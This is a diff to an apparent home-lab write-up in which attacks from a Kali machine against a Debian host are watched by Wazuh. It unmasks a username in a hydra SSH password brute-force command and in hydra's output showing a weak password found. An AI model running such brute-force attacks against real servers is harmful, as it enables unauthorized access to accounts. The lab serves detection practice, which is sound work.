@@ -135,7 +135,7 @@ All attacks go from Kali (`192.168.2.88`) to the Debian victim (`192.168.2.87`).
 
 **Attack (from Kali):**
 ```bash
-hydra -l **** -P /tmp/passwords.txt ssh://192.168.2.87 -t 4 -V
+hydra -l emran -P /tmp/passwords.txt ssh://192.168.2.87 -t 4 -V
 ```
 Hydra tries a bunch of passwords on SSH.
 
@@ -161,7 +161,7 @@ Wazuh didn't just log each failed login separately. It linked them together and 
 **Attack (from Kali):** I put a weak password (`password123`) in the list. Hydra found it:
 
 ```
-[22][ssh] host: 192.168.2.87   login: ****   password: password123
+[22][ssh] host: 192.168.2.87   login: emran   password: password123
 1 of 1 target successfully completed, 1 valid password found
 ```
 
